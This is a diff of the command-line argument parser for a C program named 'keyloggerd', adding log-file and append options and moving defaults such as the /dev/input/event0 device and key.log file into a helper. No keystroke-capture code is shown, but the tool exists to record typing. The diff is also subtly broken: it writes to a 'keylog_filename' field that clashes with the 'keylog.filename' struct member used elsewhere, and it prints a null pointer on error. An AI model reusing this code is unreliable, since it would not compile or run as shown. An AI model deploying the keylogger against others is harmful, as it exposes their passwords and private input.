@@ -8,12 +8,11 @@
 
 static const char usage_str[] =
 "usage: keyloggerd [-h | --help] [--debug] [--file-mode <mode>]\n"
-"                  [--keyboard-device <device_path>]"
+"                  [--keyboard-device <device_path>] [-f <logfile>]\n"
+"                  [--append]";
 
 #define is_equal(a, b) (!strcmp(a, b))
 #define BIT(shift) (1 << (shift))
-
-#define DEFAULT_KEYLOG_MODE (S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH)
 
 static mode_t str2mode(const char *mode_str)
 {
@@ -62,10 +61,10 @@ static mode_t str2mode(const char *mode_str)
     return mode;
 }
 
-cmd_args_t parse_args(int argc, char *argv[])
+static cmd_args_t arg_defaults(int argc, char *argv[])
 {
-    cmd_args_t cmd_args = {
-        .keylog_mode = DEFAULT_KEYLOG_MODE
+    cmd_args_t default_args = {
+        .keylog.mode = (S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH)
     };
 
     char *prog_name;
@@ -76,13 +75,32 @@ cmd_args_t parse_args(int argc, char *argv[])
         prog_name++;
     }
 
-    strncpy(cmd_args.prog_name, prog_name, MAX_PROG_NAME);
-    strncpy(cmd_args.keyboard_device, "/dev/input/event0", MAX_DEVICE_PATH);
+    strncpy(default_args.prog_name, prog_name, MAX_PROG_NAME);
+    strncpy(default_args.keyboard_device, "/dev/input/event0", MAX_DEVICE_PATH);
+    strncpy(default_args.keylog.filename, "key.log", KEY_LOG_LEN);
+
+    return default_args;
+}
+
+cmd_args_t parse_args(int argc, char *argv[])
+{
+    cmd_args_t cmd_args = arg_defaults(argc, argv);
 
     for (int k = 1; k < argc; k++) {
         const char *arg = argv[k];
 
-        if (is_equal(arg, "--keyboard-device")) {
+        if (is_equal(arg, "-f")) {
+            const char *filename_str = argv[++k];
+
+            if (filename_str) {
+                strncpy(cmd_args.keylog_filename, filename_str, KEY_LOG_LEN);
+            } else {
+                printf("Invalid filename for key log: %s\n", filename_str);
+                exit(1);
+            }
+        } else if (is_equal(arg, "--append")) {
+            cmd_args.append_keylog = true;
+        } else if (is_equal(arg, "--keyboard-device")) {
             const char *device_str = argv[++k];
 
             if (device_str) {
